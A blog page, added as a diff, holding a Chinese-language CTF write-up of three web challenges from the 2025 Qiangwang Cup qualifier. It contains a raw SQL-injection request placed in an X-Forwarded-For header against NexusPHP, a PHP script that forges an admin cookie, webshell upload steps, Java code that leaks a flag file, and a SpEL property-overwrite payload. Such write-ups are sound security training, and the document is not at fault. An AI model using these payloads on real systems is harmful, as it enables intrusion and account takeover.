@@ -1,0 +1,204 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup | Rusty_Blog</title><meta name="author" content="Rusty"><meta name="copyright" content="Rusty"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 WriteupPTer&#x2F;openresty&#x2F;sites&#x2F;app.conf，可能就是题目所说的安全更新 ? 那我们重点关注&#x2F;announce.php  IP这里是可控的，可以伪造IP，直接拼接会造成sql注入  可以sql注入，但是密码加盐了 获取一个种子文件的info_hash 1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup">
+<meta property="og:url" content="https://blog.rusty1e.top/2026/03/21/%E5%BC%BA%E7%BD%91%E6%9D%AF%202025/index.html">
+<meta property="og:site_name" content="Rusty_Blog">
+<meta property="og:description" content="第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 WriteupPTer&#x2F;openresty&#x2F;sites&#x2F;app.conf，可能就是题目所说的安全更新 ? 那我们重点关注&#x2F;announce.php  IP这里是可控的，可以伪造IP，直接拼接会造成sql注入  可以sql注入，但是密码加盐了 获取一个种子文件的info_hash 1234567891">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.rusty1e.top/image/default_cover1.jpg">
+<meta property="article:published_time" content="2026-03-21T10:58:00.000Z">
+<meta property="article:modified_time" content="2026-03-21T11:37:30.960Z">
+<meta property="article:author" content="Rusty">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.rusty1e.top/image/default_cover1.jpg"><link rel="shortcut icon" href="/image/icon.png"><link rel="canonical" href="https://blog.rusty1e.top/2026/03/21/%E5%BC%BA%E7%BD%91%E6%9D%AF%202025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/image/wallhaven-jxl3qp.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> L1nk</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/default_cover1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rusty_Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> L1nk</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-21T10:58:00.000Z" title="发表于 2026-03-21 18:58:00">2026-03-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-21T11:37:30.960Z" title="更新于 2026-03-21 19:37:30">2026-03-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="第九届“强网杯”全国网络安全挑战赛初赛-2025-个人题解-Writeup"><a href="#第九届“强网杯”全国网络安全挑战赛初赛-2025-个人题解-Writeup" class="headerlink" title="第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup"></a>第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup</h1><h2 id="PTer"><a href="#PTer" class="headerlink" title="PTer"></a>PTer</h2><p>&#x2F;openresty&#x2F;sites&#x2F;app.conf，可能就是题目所说的安全更新 ?</p>
+<p>那我们重点关注&#x2F;announce.php</p>
+<p><img src="https://oss.rusty1e.top/blog/2026/03/93c841cb9da9a408343e5528c056c4dc.png" alt="a"></p>
+<p>IP这里是可控的，可以伪造IP，直接拼接会造成sql注入</p>
+<p><img src="https://oss.rusty1e.top/blog/2026/03/92a36afcb358ec48c5956fac0ce5d093.png" alt="945a5261-e8a3-4fb5-9729-9bf07b3520d3"></p>
+<p>可以sql注入，但是密码加盐了</p>
+<p>获取一个种子文件的info_hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import bencodepy</span><br><span class="line">def calculate_info_hash(torrent_file_path):</span><br><span class="line">    # 读取种子文件</span><br><span class="line">    with open(torrent_file_path, &#x27;rb&#x27;) as f:</span><br><span class="line">        torrent_data = f.read()</span><br><span class="line">    # 解析种子文件</span><br><span class="line">    torrent = bencodepy.decode(torrent_data)</span><br><span class="line">    # 获取info字典并计算其SHA1哈希</span><br><span class="line">    info_dict = torrent[b&#x27;info&#x27;]</span><br><span class="line">    info_bencoded = bencodepy.encode(info_dict)</span><br><span class="line">    info_hash = hashlib.sha1(info_bencoded).digest()</span><br><span class="line">    return info_hash</span><br><span class="line"># 使用示例</span><br><span class="line">torrent_path = &quot;zhongzi.torrent&quot;</span><br><span class="line">info_hash = calculate_info_hash(torrent_path)</span><br><span class="line"># 输出十六进制格式</span><br><span class="line">print(&quot;info_hash (hex):&quot;, info_hash.hex())</span><br><span class="line"># 输出URL编码格式（用于HTTP请求）</span><br><span class="line">url_encoded = &#x27;&#x27;.join([&#x27;%%%02X&#x27; % b for b in info_hash])</span><br><span class="line">print(&quot;info_hash (URL encoded):&quot;, url_encoded)</span><br><span class="line"></span><br><span class="line">#info_hash (hex): 2caa6a5f5227bea76bbe4ab88a2da4b5cd6b7c1f</span><br><span class="line">#info_hash (URL encoded): %2C%AA%6A%5F%52%27%BE%A7%6B%BE%4A%B8%8A%2D%A4%B5%CD%6B%7C%1F</span><br></pre></td></tr></table></figure>
+
+<p>nexusPHP对客户端类型有要求，禁止一些客户端进行连接，通过peer_id和User-Agent来识别客户端</p>
+<p>不知道为什么，我这里sql注入无法稳定出现，需要多次发包</p>
+<p>sql注入手注数据包（yakit)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /announce.php?passkey=0ef547977bb67b8fdf34dbba8ac28efa&amp;info_hash=%2C%AA%6A%5F%52%27%BE%A7%6B%BE%4A%B8%8A%2D%A4%B5%CD%6B%7C%1F&amp;peer_id=-UT2000-121466780701&amp;port=3881&amp;downloaded=0&amp;uploaded=0&amp;left=0&amp;ipx=15.&#123;&#123;int(1-2)&#125;&#125;.3.5&amp;event=stopped HTTP/1.1</span><br><span class="line">Host: pter.qwb.local</span><br><span class="line">Cookie: c_secure_pass=eyJ1c2VyX2lkIjoiMTAwMDIiLCJleHBpcmVzIjoxNzkyMjk1OTczfS43ODA1MTVhYjkwNGNlOWZlYTY5OTcxMmEwNGMxNTRhZTY5ZmM2YzIxM2YzZGRhNGI0ZWY1ZDhiMmZiYWU4N2Zk</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: uTorrent/2000</span><br><span class="line">X-Forwarded-For: 1&#x27;  UNION ( SELECT 1 FROM users WHERE (username=&#x27;admin&#x27; and auth_key &gt; &#x27;73ec97f741&#x27;)   ) -- # &#x27;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我手注一晚上的成果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#passhash</span><br><span class="line">3f54e9d81e9ce7a9c275c0e947db6bda1be213e868769461d03c3377b0eead18</span><br><span class="line"></span><br><span class="line">#secret(没注完)</span><br><span class="line">4bb3ce43697</span><br><span class="line"></span><br><span class="line">#直接用auth_key生成cookie就好</span><br><span class="line">auth_key</span><br><span class="line">73ec97f74152abca89d44ec21be2e46b54b86947</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>密码加盐了，但是我们可以直接注入获取auth_key来生成token</p>
+<p>通过注入获取admin用户的auth_key生成c_secure_pass</p>
+<p>分析一下token的生成逻辑</p>
+<p><img src="https://oss.rusty1e.top/blog/2026/03/be7a707ed1ddbbbebdc75d7a057ebde4.png" alt="3"></p>
+<p>模仿这里的代码写一个php小脚本来生成token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$authKey=&quot;73ec97f74152abca89d44ec21be2e46b54b86947&quot;;</span><br><span class="line">$tokenData = [</span><br><span class="line">        &#x27;user_id&#x27; =&gt; &#x27;1&#x27;,</span><br><span class="line">        &#x27;expires&#x27; =&gt; &#x27;1792295973&#x27;,</span><br><span class="line">    ];</span><br><span class="line">    $tokenJson = json_encode($tokenData);</span><br><span class="line">    $signature = hash_hmac(&#x27;sha256&#x27;, $tokenJson, $authKey);</span><br><span class="line">    $authToken = base64_encode($tokenJson . &#x27;.&#x27; . $signature);</span><br><span class="line">echo $authToken;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>登录到后台</p>
+<p>修改网站设置，开启附件上传功能，添加php到文件上传白名单，同时修改附件保存位置到public，以便上传的webshell可以被我们访问<img src="https://oss.rusty1e.top/blog/2026/03/8900474b495a6d3bf5e8390c9492834e.png" alt="4"></p>
+<p>分析attachement.php</p>
+<p><img src="https://oss.rusty1e.top/blog/2026/03/6b6c301a0e24b8dd170ccbe3e9b40822.png" alt="5"></p>
+<p>发现会上传文件到<code>$savepath</code>，这个变量是我们可以设置的附件保存位置，并且虽然对文件进行了重命名，但文件名是可以预测的，<code>$filename</code>是当前<code>YmdHis</code>拼接<code>$filemd5</code></p>
+<p><img src="https://oss.rusty1e.top/blog/2026/03/76d1065fb8414fcf8ac69182de04db5f.png" alt="7"></p>
+<p>模拟php的md5_file()函数获取文件的md5哈希，或者用cyberchef</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;模拟 PHP 的 md5_file() 函数&quot;&quot;&quot;</span><br><span class="line">    with open(file_path, &#x27;rb&#x27;) as f:</span><br><span class="line">        file_content = f.read()</span><br><span class="line">        md5_hash = hashlib.md5(file_content).hexdigest()</span><br><span class="line">    return md5_hash</span><br><span class="line"></span><br><span class="line"># 使用示例</span><br><span class="line">file_path = &quot;evil.php&quot;</span><br><span class="line">hash_value = md5_file(file_path)</span><br><span class="line">print(f&quot;MD5: &#123;hash_value&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<p><img src="https://oss.rusty1e.top/blog/2026/03/fbdf1b5ace58c4b6e115c13e8fcc33f8.png" alt="7"></p>
+<h2 id="yamcs"><a href="#yamcs" class="headerlink" title="yamcs"></a>yamcs</h2><p>没啥好说的</p>
+<p>Algorithms可以执行java代码，通过抛出报错外带flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    String flag = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(&quot;/flag&quot;)));</span><br><span class="line">    // 直接抛出包含flag的异常</span><br><span class="line">    throw new RuntimeException(&quot;FLAG: &quot; + flag);</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 重新抛出，确保错误信息包含flag</span><br><span class="line">    throw new RuntimeException(&quot;FLAG: &quot; + e.getMessage(), e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.rusty1e.top/blog/2026/03/faaa124ce9b2b27f39c06c13881cb250.png" alt="yamcs"></p>
+<h2 id="bbjv"><a href="#bbjv" class="headerlink" title="bbjv"></a>bbjv</h2><p><img src="https://oss.rusty1e.top/blog/2026/03/c822fab861b010ef71188ac81612895c.png" alt="bbjv"></p>
+<p>似乎将user.home修改为&#x2F;tmp就能获取到flag了</p>
+<p><code>Properties</code>类实现了Map接口，我们可以尝试Map的方法：</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check?rule=%23%7B%23systemProperties%5B%27user.home%27%5D+%3D+%27%2Ftmp%27%7D</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.rusty1e.top">Rusty</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.rusty1e.top/2026/03/21/%E5%BC%BA%E7%BD%91%E6%9D%AF%202025/">https://blog.rusty1e.top/2026/03/21/%E5%BC%BA%E7%BD%91%E6%9D%AF%202025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.rusty1e.top" target="_blank">Rusty_Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="/image/default_cover1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/08/2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="迟来的2025年终总结"><img class="cover" src="https://oss.rusty1e.top/blog/2026/02/c900e98fb34097a6c5ceaef1ce132397.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">迟来的2025年终总结</div></div><div class="info-2"><div class="info-item-1">个人2025年终总结一月买了个J1900刷软路由玩玩，天天折腾，系统刷来刷去最后刷了IStoreOS，然后带着回老家过年了 看展子——沉入暗夜   二月打了VNCTF2025，只出了一道web题目，无缘于VN了，还是太菜了 变成了在老家倒腾软路由的神人 三月去长沙参加了ccsssc的华南区域赛，队友带飞，排名够了晋级决赛了，爽吃湘菜和茶颜悦色了，虽然刚在老家猛炫过 去了下长沙的五一广场，好多人 四月上学，好像没干啥特别的事情，跟朋友去下了个馆子，但是有鸽子 五月去了ccsssc的决赛，又在长沙，比赛最后好像坐牢了，拿了三等奖 跟队友去橘子洲玩了下  独立寒秋，湘江北去，橘子洲头 六月体育课期末考试了，我选的射箭，绝望地放箭中，最后10支箭83环，还行 端午节假期的时候和烧卖的师傅们一起打了下D^3CTF，打CTF以来第一次夺冠，做了2道web总共1000分，喜提Binary...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/07/D3CTF2025/" title="2025 D^3CTF个人web方向wp题解"><img class="cover" src="/image/D3CTF2025/main_2025.52a5fcdd.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-07</div><div class="info-item-2">2025 D^3CTF个人web方向wp题解</div></div><div class="info-2"><div class="info-item-1">2025 D^3CTF个人web方向wp题解d3invitation信息搜集题目容器显示有一个minio存储桶，一开始先测试了Minio的未授权信息泄露CVE，无果，遂继续抓包分析，并将static/js/tools.js丢给AI分析了一下，发现总共就三个接口：/api/genSTSCreds，/api/getObject，/api/putObject /api/genSTSCreds 接口可以获取STS凭证 12345678910111213POST /api/genSTSCreds HTTP/1.1Host: 34.150.83.54:31668Content-Length: 26Accept-Language: zh-CN,zh;q=0.9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Content-Type: application/jsonAccept:...</div></div></div></a><a class="pagination-related" href="/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025/" title="羊城杯2025个人web方向wp题解"><img class="cover" src="/image/ycb/0abd87eaa8c138fbafe80897ad42627e.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-13</div><div class="info-item-2">羊城杯2025个人web方向wp题解</div></div><div class="info-2"><div class="info-item-1">羊城杯2025个人web方向wp题解ezsignin二血 /register和/login存在sql注入 1234567891011121314151617sqlmap.py -r .\sqlm2.txt --technique B --ignore-code 401 --risk 3 --level 5 --sql-shellPOST /login HTTP/1.1Host: 45.40.247.139:26273User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateCache-Control: max-age=0Origin: http://45.40.247.139:26273Content-Type: application/x-www-form-urlencodedAccept:...</div></div></div></a><a class="pagination-related" href="/2025/09/23/WMCTF%202025/" title="WMCTF 2025 Writeup"><img class="cover" src="/image/default_cover4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-23</div><div class="info-item-2">WMCTF 2025 Writeup</div></div><div class="info-2"><div class="info-item-1">WMCTF 2025 个人题解25th  WEBguess参考文章：https://xz.aliyun.com/news/17384 这里我直接给出我的payload，使用randcrack一把梭 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import requestsfrom randcrack import RandCrack# 目标URL（根据实际目标修改）base_url = &quot;http://********:****&quot;  # 替换为目标URL#替换为你自己的服务器地址lhost=&quot;****&quot;lport=****# 初始化RandCrackrc = RandCrack()# 收集624个随机数通过注册用户（Mersenne Twister需要624个32位值来预测）for i in...</div></div></div></a><a class="pagination-related" href="/2025/08/30/LilCTF%202025/" title="LilCTF 2025 Writeup"><img class="cover" src="/image/default_cover2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-30</div><div class="info-item-2">LilCTF 2025 Writeup</div></div><div class="info-2"><div class="info-item-1">LilCTF 2025 Writeup by Team Volcania_Rusty个人解出的题目 完整WP见https://bili33.top/posts/LilCTF2025-Writeup/ WebEkko Note数据库关系如下  通过这里的注释，可以猜到题目大概与random伪随机有关系，如果拿到seed，就可以预测random生成的随机值 1234# 欸我艹这两行代码测试用的忘记删了，欸算了都发布了，我们都在用力地活着，跟我的下班说去吧。# 反正整个程序没有一个地方用到random库。应该没有什么问题。import randomrandom.seed(SERVER_START_TIME)  题目提到的 RCE 相关代码 123456789101112131415161718@app.route(&#x27;/execute_command&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])@login_requireddef execute_command():    result =...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Rusty</div><div class="author-info-description">我走的时候江水很平静</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/rusty1e"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Blue, Cyan and Azure</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%B1%8A%E2%80%9C%E5%BC%BA%E7%BD%91%E6%9D%AF%E2%80%9D%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-2025-%E4%B8%AA%E4%BA%BA%E9%A2%98%E8%A7%A3-Writeup"><span class="toc-number">1.</span> <span class="toc-text">第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PTer"><span class="toc-number">1.1.</span> <span class="toc-text">PTer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yamcs"><span class="toc-number">1.2.</span> <span class="toc-text">yamcs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bbjv"><span class="toc-number">1.3.</span> <span class="toc-text">bbjv</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/03/21/%E5%BC%BA%E7%BD%91%E6%9D%AF%202025/" title="第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup"><img src="/image/default_cover1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 Writeup"/></a><div class="content"><a class="title" href="/2026/03/21/%E5%BC%BA%E7%BD%91%E6%9D%AF%202025/" title="第九届“强网杯”全国网络安全挑战赛初赛 2025 个人题解 